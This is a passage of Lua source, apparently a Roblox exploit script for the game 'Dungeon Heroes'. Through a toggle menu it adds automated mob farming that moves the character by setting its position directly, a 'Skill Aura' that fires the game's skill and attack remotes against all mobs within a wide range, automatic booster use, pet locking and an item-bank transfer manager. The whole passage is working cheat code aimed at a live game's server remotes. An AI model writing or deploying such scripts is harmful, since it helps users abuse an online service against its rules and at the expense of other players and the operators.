            local Root = Character and Character:FindFirstChild("HumanoidRootPart")
            local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")

            if not Root or not Humanoid or Humanoid.Health <= 0 then
                IsMovingToMob = false
                return
            end

            -- Prevent tripping / ragdoll / falling states at high speeds
            if Humanoid.PlatformStand then
                Humanoid.PlatformStand = false
            end
            if Humanoid.Sit then
                Humanoid.Sit = false
            end

            -- SEARCH ENTIRE DUNGEON
            local Mob = GetNearestMob()

            -- NO VALID MOB ANYWHERE
            if not Mob then
                if IsMovingToMob then
                    IsMovingToMob = false
                    RestoreCharacterCollision()
                    Root.AssemblyLinearVelocity = Vector3.zero
                    Root.AssemblyAngularVelocity = Vector3.zero
                end
                ReleasePlatform()
                return
            end

            local MobRoot = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
            if not MobRoot then
                IsMovingToMob = false
                ReleasePlatform()
                return
            end

            -- Active Mob Target Found -> Enable NoClip & Anti-Fling Physics Lock
            IsMovingToMob = true

            -- Kill all physics forces so character never flings or breaks joints
            Root.AssemblyLinearVelocity = Vector3.zero
            Root.AssemblyAngularVelocity = Vector3.zero

            -- CREATE OR RE-ANCHOR PLATFORM
            CreatePlatform(Root)

            -- TARGET POSITION ABOVE MOB
            local TargetPosition = MobRoot.Position + Vector3.new(0, FloatHeight, 0)
            local Difference = TargetPosition - Root.Position
            local Distance = Difference.Magnitude

            -- Keep character strictly upright (prevents tilting/spinning after bumping obstacles)
            local _, CurrentYaw, _ = Root.CFrame:ToEulerAnglesYXZ()
            local UprightRotation = CFrame.Angles(0, CurrentYaw, 0)

            if Distance > 0.05 then
                local Step = math.min(MoveSpeed * StepTime, Distance)
                local NewPosition = Root.Position + (Difference.Unit * Step)
                Root.CFrame = CFrame.new(NewPosition) * UprightRotation
            else
                Root.CFrame = CFrame.new(TargetPosition) * UprightRotation
            end

            -- PLATFORM LOCKED UNDER PLAYER
            if SupportPlatform and SupportPlatform.Parent then
                SupportPlatform.CFrame = CFrame.new(
                    Root.Position - Vector3.new(0, PlatformOffset, 0)
                )
            end

            -- PET FOLLOWS ONLY WHEN VALID MOB EXISTS
            LockPetToPlayer(Root)
        end)
    end)
end

-- MAIN TOGGLE
UtilityTab:CreateToggle({
    Name = "Auto Mobs",
    CurrentValue = false,
    Flag = "AutoMobsToggle",

    Callback = function(Value)
        if Value then
            StartAutoMobs()
        else
            StopAutoMobs()
        end
    end
})

-- FLOAT HEIGHT
UtilityTab:CreateSlider({
    Name = "Mob Float Height",
    Range = {10, 200},
    Increment = 1,
    Suffix = "Studs",
    CurrentValue = 30,
    Flag = "MobFloatHeight",

    Callback = function(Value)
        FloatHeight = Value
    end
})

-- MOVEMENT SPEED
UtilityTab:CreateSlider({
    Name = "Movement Speed",
    Range = {100, 1000},
    Increment = 25,
    Suffix = "Speed",
    CurrentValue = 250,
    Flag = "MovementSpeed",

    Callback = function(Value)
        MoveSpeed = Value
    end
})

-- RESPAWN CLEANUP
Player.CharacterAdded:Connect(function()
    table.clear(OriginalCollideStates)

    if SupportPlatform then
        SupportPlatform:Destroy()
        SupportPlatform = nil
    end

    -- If toggle is still ON after respawn, automatically re-attach after character loads
    if AutoMobs then
        task.wait(0.5)
        if AutoMobs then
            StartAutoMobs()
        end
    end
end)
                    
do
--====================================================
-- DUNGEON HEROES | 1-TOGGLE AUTO SKILL AURA (SLOTS 1-5)
-- Dynamically Reads Slots 1-4 + Slot 5 (Mastery Ultimate)
-- Works With All 180 Skills | No UI Notifications
--====================================================

local SkillAuraEnabled = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes")
local UseSkillRemote = Remotes:WaitForChild("UseSkill")
local PlayerSkillAttackRemote = Remotes:WaitForChild("PlayerSkillAttack")
local InterruptSkillRemote = Remotes:WaitForChild("InterruptSkill")
local UseUltimateRemote = Remotes:FindFirstChild("Masteries/UseUltimate")

local ProfileSystem = require(ReplicatedStorage.Systems.Profile)
local Items = require(ReplicatedStorage.Systems.Items)
local SkillsSystem = require(ReplicatedStorage.Systems.Skills)
local MasteriesSystem = require(ReplicatedStorage.Systems.Masteries)

-- Uses your existing CONFIG table if present, otherwise defaults
local SKILL_AURA_CONFIG = CONFIG or {
    KillRange = 500,
    AttackSpeed = 0.1
}

-- ==========================================
-- LIVE AUTO-DETECTION FOR SLOTS 1-4 & SLOT 5 (ULTIMATE)
-- ==========================================
local function GetAllActiveSkills()
    local ActiveSkills = {}
    local Seen = {}

    local function AddSkill(SkillId, IsUlt)
        if type(SkillId) == "string" and #SkillId > 0 and not Seen[SkillId] then
            Seen[SkillId] = true
            table.insert(ActiveSkills, {
                Name = SkillId,
                IsUltimate = IsUlt == true
            })
        end
    end

    -- 1. SLOTS 1 TO 4: Official Skills:GetSkillInActiveSlot(LocalPlayer, slot)
    for Slot = 1, 4 do
        local Ok, SkillName = pcall(function()
            return SkillsSystem:GetSkillInActiveSlot(LocalPlayer, Slot)
        end)
        if Ok and type(SkillName) == "string" and #SkillName > 0 then
            AddSkill(SkillName, false)
        end
    end

    -- 2. SLOTS 1 TO 4 FALLBACK: Read Profile.Equipped.Skill1..4 -> Items:GetItemData().Skill
    local Profile = nil
    pcall(function()
        Profile = ProfileSystem:GetProfile(LocalPlayer)
    end)

    if Profile and Profile:FindFirstChild("Equipped") then
        for Slot = 1, 4 do
            local SlotFolder = Profile.Equipped:FindFirstChild("Skill" .. tostring(Slot))
            if SlotFolder then
                for _, Child in ipairs(SlotFolder:GetChildren()) do
                    local OkData, ItemData = pcall(function()
                        return Items:GetItemData(Child.Name)
                    end)
                    if OkData and type(ItemData) == "table" and type(ItemData.Skill) == "string" then
                        AddSkill(ItemData.Skill, false)
                    end
                end
            end
        end
    end

    -- 3. SLOT 5 (MASTERY ULTIMATE): Read Masteries:GetEquippedUltimate(LocalPlayer).abilityId
    local UltAdded = false
    local OkUlt, UltTable = pcall(function()
        return MasteriesSystem:GetEquippedUltimate(LocalPlayer)
    end)

    if OkUlt and type(UltTable) == "table" and type(UltTable.abilityId) == "string" and #UltTable.abilityId > 0 then
        AddSkill(UltTable.abilityId, true)
        UltAdded = true
    end

    -- Fallback for Slot 5 via ActiveMastery string (e.g. "Guardian" -> "GuardianUltimate")
    if not UltAdded and Profile and Profile:FindFirstChild("Masteries") then
        local ActiveMastery = Profile.Masteries:FindFirstChild("ActiveMastery")
        if ActiveMastery and ActiveMastery:IsA("StringValue") and #ActiveMastery.Value > 0 then
            AddSkill(ActiveMastery.Value .. "Ultimate", true)
        end
    end

    return ActiveSkills
end

-- ==========================================
-- GET EXACT HIT COUNT FOR ANY SKILL
-- ==========================================
local function GetSkillHitsCount(SkillName)
    -- 1. Try Skills:GetSkillHitTable(LocalPlayer, SkillName) (Handles Necklace-Modified Hits)
    local OkHitTbl, HitTable = pcall(function()
        return SkillsSystem:GetSkillHitTable(LocalPlayer, SkillName)
    end)
    if OkHitTbl and type(HitTable) == "table" and #HitTable > 0 then
        return #HitTable
    end

    -- 2. Fallback to Skills:GetSkillData(SkillName).Hits
    local OkData, SkillData = pcall(function()
        return SkillsSystem:GetSkillData(SkillName)
    end)
    if OkData and type(SkillData) == "table" and type(SkillData.Hits) == "table" and #SkillData.Hits > 0 then
        return #SkillData.Hits
    end

    return 1
end

-- ==========================================
-- COLLECT TARGET MOBS IN RANGE
-- ==========================================
local function GetTargetsInRange()
    local Character = LocalPlayer.Character
    local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
    local MobsFolder = workspace:FindFirstChild("Mobs")

    if not HRP or not MobsFolder then
        return {}
    end

    local Range = (CONFIG and CONFIG.KillRange) or SKILL_AURA_CONFIG.KillRange or 200
    local RealMobs = {}
    local DummyMobs = {}

    for _, Mob in ipairs(MobsFolder:GetChildren()) do
        local MobHRP = Mob:FindFirstChild("HumanoidRootPart")
        local HP = Mob:GetAttribute("HP")

        if MobHRP
            and HP ~= "0"
            and HP ~= 0
            and not Mob:GetAttribute("Owner")
            and (MobHRP.Position - HRP.Position).Magnitude <= Range then

            if Mob.Name == "TargetDummy" then
                table.insert(DummyMobs, Mob)
            else
                table.insert(RealMobs, Mob)
            end
        end
    end

    -- Prioritize real dungeon mobs; fallback to TargetDummy in lobby for testing
    local BaseMobs = (#RealMobs > 0) and RealMobs or DummyMobs
    if #BaseMobs == 0 then
        return {}
    end

    -- Build multi-target hit table (matches game's remote structure)
    local TargetTable = {}
    for _, Mob in ipairs(BaseMobs) do
        for _ = 1, 4 do
            table.insert(TargetTable, Mob)
        end
    end

    return TargetTable
end

-- ==========================================
-- MAIN SKILL AURA LOOP
-- ==========================================
local function StartSkillAura()
    task.spawn(function()
        while SkillAuraEnabled do
            task.wait()

            local EquippedSkills = GetAllActiveSkills()
            local InitialTargets = GetTargetsInRange()

            if #EquippedSkills > 0 and #InitialTargets > 0 then
                for _, SkillEntry in ipairs(EquippedSkills) do
                    if not SkillAuraEnabled then break end

                    local Targets = GetTargetsInRange()
                    if #Targets == 0 then break end

                    local SkillName = SkillEntry.Name
                    local HitCount = GetSkillHitsCount(SkillName)

                    -- 1. If Slot 5 (Ultimate), trigger Ultimate remote + UseSkill remote
                    if SkillEntry.IsUltimate and UseUltimateRemote then
                        pcall(function()
                            UseUltimateRemote:FireServer()
                        end)
                    end

                    -- 2. Activate Skill on Server (Opens RegisterSkillUseForHits window)
                    UseSkillRemote:FireServer(SkillName, 1)
                    task.wait(0.04)

                    -- 3. Fire PlayerSkillAttack for every hit index in the skill's Hits table
                    for HitIndex = 1, HitCount do
                        if not SkillAuraEnabled then break end
                        PlayerSkillAttackRemote:FireServer(Targets, SkillName, HitIndex)
                        if HitCount > 1 then
                            task.wait(0.02)
                        end
                    end

                    -- 4. Clear server "busy" cast state so the next skill slot can fire immediately
                    task.wait(0.03)
                    InterruptSkillRemote:FireServer()

                    local Speed = (CONFIG and CONFIG.AttackSpeed) or SKILL_AURA_CONFIG.AttackSpeed or 0.15
                    task.wait(Speed)
                end
            else
                task.wait(0.1)
            end
        end
    end)
end

-- ==========================================
-- SINGLE TOGGLE ON MAINTAB
-- ==========================================
MainTab:CreateToggle({
    Name = "Skill Aura",
    CurrentValue = false,
    Flag = "SkillAura",
    Callback = function(Value)
        SkillAuraEnabled = Value
        if Value then
            StartSkillAura()
        end
    end
})
end


UtilityTab:CreateSection("Auto Booster")

-- Dungeon Heroes | Auto Booster
-- Auto Refresh + Favorite Protection

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local Player = Players.LocalPlayer
local Items = require(RS.Systems.Items)

local ActivateBooster = RS:WaitForChild("Remotes"):WaitForChild("ActivateBooster")

local AutoEnabled = false
local WorkerId = 0
local SentCount = {}

-- Get Inventory
local function GetInventory()
return Items:GetPlayerItemFolder(Player, "Inventory")
end

-- Scan Boosters
local function ScanBoosters()
local Inventory = GetInventory()
if not Inventory then return end

for _, item in ipairs(Inventory:GetChildren()) do  
    if not AutoEnabled then break end  

    local success, err = pcall(function()  
        local itemData = Items:GetItemData(item.Name)  

        if not itemData or itemData.Category ~= "Booster" then  
            return  
        end  

        -- Favorite Protection  
        if Items:ItemIsFavorited(item) then  
            return  
        end  

        -- Get UID  
        local uid = Items:ItemRefForRemote(item)  

        if typeof(uid) ~= "string" or uid == "" then  
            return  
        end  

        -- Get Count  
        local countObject = item:FindFirstChild("Count")  
        local totalCount = countObject and countObject.Value or 1  

        local alreadySent = SentCount[uid] or 0  

        while alreadySent < totalCount and AutoEnabled do  
            if Items:ItemIsFavorited(item) then  
                break  
            end  

            ActivateBooster:FireServer(uid)  

            alreadySent += 1  
            SentCount[uid] = alreadySent  

            task.wait(0.5)  
        end  
    end)  

    if not success then  
        warn("[Auto Booster]", err)  
    end  
end

end

UtilityTab:CreateToggle({
Name = "Auto Activate Boosters",
CurrentValue = false,
Flag = "AutoBooster",

Callback = function(Value)  
    AutoEnabled = Value  
    WorkerId += 1  

    if Value then  
        local thisWorker = WorkerId  

        task.spawn(function()  
            while AutoEnabled and WorkerId == thisWorker do  
                ScanBoosters()  
                task.wait(1)  
            end  
        end)  
    end  
end

})


--====================================================
-- DUNGEON HEROES | PET LOCK ONLY
-- Separate Rayfield UI | One Toggle Only
-- Default Pet Position | Smooth Follow
--====================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local Player = Players.LocalPlayer

local PetLockEnabled = false
local Connection = nil

-- DEFAULT FOLLOW POSITION
local PetOffset = Vector3.new(3, 2, 0)

-- GET EQUIPPED PET
local function GetMyPet()
    local Folder = workspace:FindFirstChild("Mobs")
    if not Folder then return nil end

    for _, Mob in ipairs(Folder:GetChildren()) do
        if Mob:GetAttribute("Owner") == Player.Name then
            return Mob
        end
    end

    return nil
end

-- GET PET ROOT
local function GetPetRoot(Pet)
    if not Pet then return nil end

    if Pet:IsA("BasePart") then
        return Pet
    end

    if Pet:IsA("Model") then
        return Pet:FindFirstChild("HumanoidRootPart")
            or Pet.PrimaryPart
            or Pet:FindFirstChildWhichIsA("BasePart", true)
    end

    return nil
end

-- SMOOTH PET FOLLOW
local function FollowPet(DeltaTime)
    local Character = Player.Character
    local PlayerRoot = Character
        and Character:FindFirstChild("HumanoidRootPart")

    if not PlayerRoot then return end

    local Pet = GetMyPet()
    if not Pet or not Pet.Parent then return end

    local PetRoot = GetPetRoot(Pet)
    if not PetRoot then return end

    local TargetPosition =
        PlayerRoot.CFrame:PointToWorldSpace(PetOffset)

    local CurrentPivot

    if Pet:IsA("Model") then
        CurrentPivot = Pet:GetPivot()
    else
        CurrentPivot = Pet.CFrame
    end

    local TargetPivot =
        CFrame.new(TargetPosition) * CurrentPivot.Rotation

    local Alpha = 1 - math.exp(-20 * DeltaTime)
    local NewPivot = CurrentPivot:Lerp(TargetPivot, Alpha)

    if Pet:IsA("Model") then
        Pet:PivotTo(NewPivot)
    else
        Pet.CFrame = NewPivot
    end
end

-- ONLY TOGGLE
MiscellaneousTab:CreateToggle({
    Name = "Pet Lock",
    CurrentValue = false,
    Flag = "PetLockOnly",

    Callback = function(Value)
        PetLockEnabled = Value

        if Connection then
            Connection:Disconnect()
            Connection = nil
        end

        if Value then
            Connection = RunService.Heartbeat:Connect(function(DeltaTime)
                if not PetLockEnabled then return end

                pcall(function()
                    FollowPet(DeltaTime)
                end)
            end)
        end
    end
})

-- RESPAWN CLEANUP
Player.CharacterAdded:Connect(function()
    if Connection then
        Connection:Disconnect()
        Connection = nil
    end

    PetLockEnabled = false
end)


 UtilityTab:CreateSection("Ultimate Item Bank Manager")
do
    --====================================================
    -- DUNGEON HEROES | ULTIMATE ITEM BANK MANAGER (PRO V4)
    -- * Verified Transfer Check (Zero Fake Notifications!)
    -- * Auto-Blacklists Server-Rejected / Unbankable UIDs
    -- * Deep Starred/Favorite + ItemCanUseItemBank Protection
    -- * Multi-Category Dropdown + Compact Glassmorphism Tap-to-Close UI
    --====================================================

    local Players = game:GetService("Players")
    local RS = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local CoreGui = game:GetService("CoreGui")

    local Player = Players.LocalPlayer

    local Items = require(RS.Systems.Items)
    local ProfileSystem = require(RS.Systems.Profile)
    local ItemBankRemote = RS:WaitForChild("Remotes"):WaitForChild("ItemBankTransfer")

    -- ==========================================
    -- COMPACT GLASSMORPHISM UI (TAP TO DISMISS)
    -- ==========================================
    local function ShowTopNotification(TitleText, SubText, AccentColor, Duration)
        task.spawn(function()
            pcall(function()
                local ShowTime = Duration or 3.0
                local ThemeColor = AccentColor or Color3.fromRGB(0, 230, 155)

                local ParentGui = (gethui and gethui())
                    or CoreGui
                    or Player:WaitForChild("PlayerGui")

                local OldGui = ParentGui:FindFirstChild("DH_BankGlassNotify")
                if OldGui then OldGui:Destroy() end

                local ScreenGui = Instance.new("ScreenGui")
                ScreenGui.Name = "DH_BankGlassNotify"
                ScreenGui.IgnoreGuiInset = true
                ScreenGui.DisplayOrder = 999999
                ScreenGui.Parent = ParentGui

                local Card = Instance.new("Frame")
                Card.Size = UDim2.new(0, 300, 0, 48)
                Card.Position = UDim2.new(0.5, -150, 0, -65)
                Card.BackgroundColor3 = Color3.fromRGB(16, 20, 30)
                Card.BackgroundTransparency = 0.18
                Card.BorderSizePixel = 0
                Card.ClipsDescendants = true
                Card.Parent = ScreenGui

                local CardCorner = Instance.new("UICorner")
                CardCorner.CornerRadius = UDim.new(0, 14)
                CardCorner.Parent = Card

                local GlassGradient = Instance.new("UIGradient")
                GlassGradient.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 52, 72)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(22, 26, 38)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(14, 17, 26))
                })
                GlassGradient.Transparency = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.12),
                    NumberSequenceKeypoint.new(1, 0.25)
                })
                GlassGradient.Rotation = 125
                GlassGradient.Parent = Card

                local GlassStroke = Instance.new("UIStroke")
                GlassStroke.Color = ThemeColor
                GlassStroke.Thickness = 1.2
                GlassStroke.Transparency = 0.32
                GlassStroke.Parent = Card

                local StrokeGradient = Instance.new("UIGradient")
                StrokeGradient.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, ThemeColor),
                    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(180, 195, 225)),
                    ColorSequenceKeypoint.new(1, ThemeColor)
                })
                StrokeGradient.Rotation = 45
                StrokeGradient.Parent = GlassStroke

                local AccentPill = Instance.new("Frame")
                AccentPill.Size = UDim2.new(0, 4, 0, 26)
                AccentPill.Position = UDim2.new(0, 9, 0.5, -13)
                AccentPill.BackgroundColor3 = ThemeColor
                AccentPill.BorderSizePixel = 0
                AccentPill.Parent = Card

                local PillCorner = Instance.new("UICorner")
                PillCorner.CornerRadius = UDim.new(1, 0)
                PillCorner.Parent = AccentPill

                local Title = Instance.new("TextLabel")
                Title.Size = UDim2.new(1, -28, 0, 17)
                Title.Position = UDim2.new(0, 20, 0, 6)
                Title.BackgroundTransparency = 1
                Title.Font = Enum.Font.GothamBold
                Title.TextSize = 12
                Title.TextColor3 = ThemeColor
                Title.TextXAlignment = Enum.TextXAlignment.Left
                Title.TextTruncate = Enum.TextTruncate.AtEnd
                Title.Text = tostring(TitleText)
                Title.Parent = Card

                local Sub = Instance.new("TextLabel")
                Sub.Size = UDim2.new(1, -28, 0, 15)
                Sub.Position = UDim2.new(0, 20, 0, 24)
                Sub.BackgroundTransparency = 1
                Sub.Font = Enum.Font.GothamMedium
                Sub.TextSize = 11
                Sub.TextColor3 = Color3.fromRGB(220, 228, 242)
                Sub.TextXAlignment = Enum.TextXAlignment.Left
                Sub.TextTruncate = Enum.TextTruncate.AtEnd
                Sub.Text = tostring(SubText)
                Sub.Parent = Card

                local BarBg = Instance.new("Frame")
                BarBg.Size = UDim2.new(1, 0, 0, 2)
                BarBg.Position = UDim2.new(0, 0, 1, -2)
                BarBg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                BarBg.BackgroundTransparency = 0.85
                BarBg.BorderSizePixel = 0
                BarBg.Parent = Card

                local BarFill = Instance.new("Frame")
                BarFill.Size = UDim2.new(1, 0, 1, 0)
                BarFill.BackgroundColor3 = ThemeColor
                BarFill.BorderSizePixel = 0
                BarFill.Parent = BarBg

                local DismissBtn = Instance.new("TextButton")
                DismissBtn.Size = UDim2.new(1, 0, 1, 0)
                DismissBtn.BackgroundTransparency = 1
                DismissBtn.Text = ""
                DismissBtn.ZIndex = 10
                DismissBtn.Parent = Card

                local Dismissed = false
                local function DismissNow()
                    if Dismissed then return end
                    Dismissed = true

                    if Card and Card.Parent then
                        local Out = TweenService:Create(
                            Card,
                            TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                            {
                                Position = UDim2.new(0.5, -150, 0, -65),
                                BackgroundTransparency = 1
                            }
                        )
                        Out:Play()
                        Out.Completed:Wait()
                    end
                    if ScreenGui and ScreenGui.Parent then
                        ScreenGui:Destroy()
                    end
                end

                DismissBtn.Activated:Connect(DismissNow)
                DismissBtn.MouseButton1Click:Connect(DismissNow)

                TweenService:Create(
                    Card,
                    TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
                    {Position = UDim2.new(0.5, -150, 0, 14)}
                ):Play()

                TweenService:Create(
                    BarFill,
                    TweenInfo.new(ShowTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                    {Size = UDim2.new(0, 0, 1, 0)}
                ):Play()

                task.wait(ShowTime)
                DismissNow()
            end)
        end)
    end

    -- ==========================================
    -- SETTINGS & STATE VARIABLES
    -- ==========================================
    local AutoTransferEnabled = false
    local TransferDirection = "Inventory -> Bank"
    local TransferMode = "All Matching"
    local SortPriority = "Highest Level First"

    local ProtectFavorites = true
    local ProtectGearPresets = true
    local AutoStopOnLimit = true

    -- Batch & Space Limits
    local MaxTransferCount = 10 -- 0 = Unlimited
    local TransferCounter = 0
    local EnableSpaceGuard = true
    local MaxInventoryCap = 180

    -- Level Filter (Gear & Skills)
    local LevelFilterEnabled = false
    local MinLevelFilter = 1
    local MaxLevelFilter = 500

    -- Anti-Bounce & Rejected UID Blacklist (Prevents Infinite Retry / Spam)
    local ScanDelay = 0.35
    local SingleTransferDelay = 0.09
    local VerifyWaitDelay = 0.35
    local MaxVerifyChunkSize = 15
    local UIDLockDuration = 3.5

    local RecentlyTransferred = {}
    local RejectedUIDBlacklist = {} -- Key: Direction .. "|" .. UID

    -- Multi-Category State
    local SelectedCategoriesList = {"Gear (Weapon + Armor + Necklace)"}

    -- All 9 Rarities
    local AllRaritiesEnabled = false
    local RarityConfig = {
        [1] = false, -- Common
        [2] = false, -- Uncommon
        [3] = false, -- Rare
        [4] = false, -- Epic
        [5] = false, -- Legendary
        [6] = false, -- Mythic
        [7] = false, -- Primordial
        [8] = false, -- Unique
        [9] = false, -- Nightmare
    }

    -- ==========================================
    -- DYNAMIC CATEGORY LIST BUILDER
    -- ==========================================
    local function IsExcludedCategory(Data)
        if type(Data) ~= "table" then return true end
        local Cat = tostring(Data.Category or "")
        -- Cosmetics, Currencies, Titles, Emotes, and Pet Tokens cannot be stored in Item Bank
        if Cat == "Cosmetic"
            or Cat == "Currency"
            or Cat == "Title"
            or Cat == "Emote"
            or Cat == "Pet Token"
            or Cat == "" then
            return true
        end
        return false
    end

    local CategoryOptions = {
        "All Bankable Items",
        "Gear (Weapon + Armor + Necklace)",
        "Weapon Only",
        "Armor Only",
        "Necklace Only",
        "Skill Only",
        "Gear + Skills",
        "Pet Only",
        "Refined Gem Only",
    }

    local FilterMap = {
        ["All Bankable Items"] = {kind = "all_bankable"},
        ["Gear (Weapon + Armor + Necklace)"] = {kind = "gear_all"},
        ["Weapon Only"] = {kind = "category", category = "Weapon"},
        ["Armor Only"] = {kind = "category", category = "Armor"},
        ["Necklace Only"] = {kind = "category", category = "Necklace"},
        ["Skill Only"] = {kind = "category", category = "Skill"},
        ["Gear + Skills"] = {kind = "gear_and_skill"},
        ["Pet Only"] = {kind = "category", category = "Pet"},
        ["Refined Gem Only"] = {kind = "category", category = "Refined Gem"},
    }

    local KnownCategories = {
        ["Weapon"] = true,
        ["Armor"] = true,
        ["Necklace"] = true,
        ["Skill"] = true,
        ["Pet"] = true,
        ["Refined Gem"] = true,
    }

    local DynamicCategories = {}
    local ItemList = Items:GetItemList()

    for _, Data in pairs(ItemList) do
        if type(Data) == "table" and not IsExcludedCategory(Data) then
            local Cat = Data.Category
            if type(Cat) == "string" and not KnownCategories[Cat] then
                DynamicCategories[Cat] = true
            end
        end
    end

    local SortedDynamic = {}
    for Cat in pairs(DynamicCategories) do
        table.insert(SortedDynamic, Cat)
    end
    table.sort(SortedDynamic)

    for _, Cat in ipairs(SortedDynamic) do
        local Label = Cat .. " Only"
        FilterMap[Label] = {kind = "category", category = Cat}
        table.insert(CategoryOptions, Label)
    end

    local function GetCategorySummaryText()
        local Count = #SelectedCategoriesList
        if Count == 0 then
            return "No Category"
        elseif Count == 1 then
            return SelectedCategoriesList[1]
        elseif Count == 2 then
            return SelectedCategoriesList[1] .. " + " .. SelectedCategoriesList[2]
        else
            return string.format("%s +%d more", SelectedCategoriesList[1], Count - 1)
        end
    end

    local function ShouldScanPetsFolder()
        for _, OptionName in ipairs(SelectedCategoriesList) do
            local Rule = FilterMap[OptionName]
            if Rule and (Rule.kind == "all_bankable" or (Rule.kind == "category" and Rule.category == "Pet")) then
                return true
            end
        end
        return false
    end

    -- ==========================================
    -- EXACT UID, BANKABLE, LEVEL & DEEP PROTECTION HELPERS
    -- ==========================================
    local function GetItemUID(Item, FallbackKey)
        if typeof(Item) == "Instance" then
            local AttrUid = Item:GetAttribute("ItemUid")
                or Item:GetAttribute("Uid")
                or Item:GetAttribute("UID")
            if type(AttrUid) == "string" and #AttrUid > 0 then
                return AttrUid
            end
        end

        local s1, uid1 = pcall(function()
            return Items:GetItemUid(Item)
        end)
        if s1 and type(uid1) == "string" and #uid1 > 0 then
            return uid1
        end

        if type(Item) == "table" then
            local TblUid = Item.ItemUid or Item.uid or Item.UID or Item.Uid
            if type(TblUid) == "string" and #TblUid > 0 then
                return TblUid
            end
        end

        local s2, ref = pcall(function()
            return Items:ItemRefForRemote(Item)
        end)
        if s2 and type(ref) == "string" and #ref > 0 then
            return ref
        end

        if type(FallbackKey) == "string" and #FallbackKey > 0 then
            return FallbackKey
        end

        return nil
    end

    local function CanItemUseBank(Item, Data)
        if type(Items.ItemCanUseItemBank) == "function" then
            local s1, r1 = pcall(function() return Items:ItemCanUseItemBank(Item) end)
            if s1 and r1 == false then
                return false
            end

            local s2, r2 = pcall(function() return Items:ItemCanUseItemBank(Data) end)
            if s2 and r2 == false then
                return false
            end
        end

        -- Mastery reward items generally cannot be banked
        if type(Items.ItemIsMasteryReward) == "function" then
            local sM, rM = pcall(function() return Items:ItemIsMasteryReward(Item) end)
            if sM and rM == true then
                return false
            end
        end

        return true
    end

    local function GetItemDetails(Item, FallbackKey)
        local UID = GetItemUID(Item, FallbackKey)
        if not UID then return nil end

        local ID = nil
        pcall(function() ID = Items:GetItemId(Item) end)
        if not ID then
            if typeof(Item) == "Instance" then
                ID = Item.Name
            elseif type(Item) == "table" then
                ID = Item.id or Item.Id or Item.ItemId or Item.itemId or Item.Name
            end
        end
        if not ID then return nil end

        local Data = nil
        pcall(function() Data = Items:GetItemData(ID) end)
        if type(Data) ~= "table" then return nil end

        if not CanItemUseBank(Item, Data) then
            return nil
        end

        local Rarity = nil
        local sR, rVal = pcall(function() return Items:GetRarity(Item) end)
        if sR and tonumber(rVal) then
            Rarity = tonumber(rVal)
        elseif typeof(Item) == "Instance" and Item:FindFirstChild("Rarity") then
            Rarity = tonumber(Item.Rarity.Value)
        elseif type(Item) == "table" and tonumber(Item.rarity or Item.Rarity) then
            Rarity = tonumber(Item.rarity or Item.Rarity)
        else
            Rarity = tonumber(Data.Rarity) or 1
        end

        local Level = 1
        local sL, lVal = pcall(function() return Items:GetLevel(Item) end)
        if sL and tonumber(lVal) then
            Level = tonumber(lVal)
        elseif typeof(Item) == "Instance" and Item:FindFirstChild("Level") then
            Level = tonumber(Item.Level.Value) or 1
        elseif type(Item) == "table" and tonumber(Item.level or Item.Level) then
            Level = tonumber(Item.level or Item.Level)
        end

        local SeasonalLevel = 1
        if Data.Category == "Skill" then
            local sS, sVal = pcall(function() return Items:GetSeasonalLevel(Item) end)
            if sS and tonumber(sVal) then
                SeasonalLevel = tonumber(sVal)
            end
        end

        return {
            Item = Item,
            UID = UID,
            ID = ID,
            Data = Data,
            Rarity = Rarity,
            Level = Level,
            SeasonalLevel = SeasonalLevel,
        }
    end

    local FavoriteTableKeys = {
        "favorite", "Favorite", "favorited", "Favorited",
        "isFavorite", "IsFavorite", "isFavorited", "IsFavorited",
        "starred", "Starred", "locked", "Locked", "sealed", "Sealed"
    }

    local function HasTruthyTableFlag(Tbl, Keys)
        if type(Tbl) ~= "table" then return false end
        for _, K in ipairs(Keys) do
            if Tbl[K] == true then
                return true
            end
        end
        return false
    end

    local function IsItemProtected(Item)
        if ProtectFavorites then
            -- Official API checks
            local sFav1, isFav1 = pcall(function() return Items:ItemIsFavorited(Item) end)
            if sFav1 and isFav1 == true then
                return true, "Favorite"
            end

            local sFav2, isFav2 = pcall(function() return Items:ItemIsFavorited(Player, Item) end)
            if sFav2 and isFav2 == true then
                return true, "Favorite"
            end

            if typeof(Item) == "Instance" then
                for _, KeyName in ipairs({"Favorite", "Favorited", "Starred", "Locked", "Sealed"}) do
                    local Child = Item:FindFirstChild(KeyName)
                    if Child then
                        if not Child:IsA("ValueBase") or Child.Value == true then
                            return true, KeyName
                        end
                    end
                    if Item:GetAttribute(KeyName) == true then
                        return true, KeyName
                    end
                end
            elseif type(Item) == "table" then
                if HasTruthyTableFlag(Item, FavoriteTableKeys)
                    or HasTruthyTableFlag(Item.data, FavoriteTableKeys)
                    or HasTruthyTableFlag(Item.Data, FavoriteTableKeys)
                    or HasTruthyTableFlag(Item.meta, FavoriteTableKeys)
                    or HasTruthyTableFlag(Item.Meta, FavoriteTableKeys)
                    or HasTruthyTableFlag(Item.attributes, FavoriteTableKeys)
                    or HasTruthyTableFlag(Item.Attributes, FavoriteTableKeys) then
                    return true, "Favorite"
                end
            end
        end

        if ProtectGearPresets then
            if typeof(Item) == "Instance" then
                for _, Child in ipairs(Item:GetChildren()) do
                    if string.find(Child.Name, "^GearPreset") then
                        return true, "Preset"
                    end
                end
                local okAttr, attrs = pcall(function() return Item:GetAttributes() end)
                if okAttr and type(attrs) == "table" then
                    for k, v in pairs(attrs) do
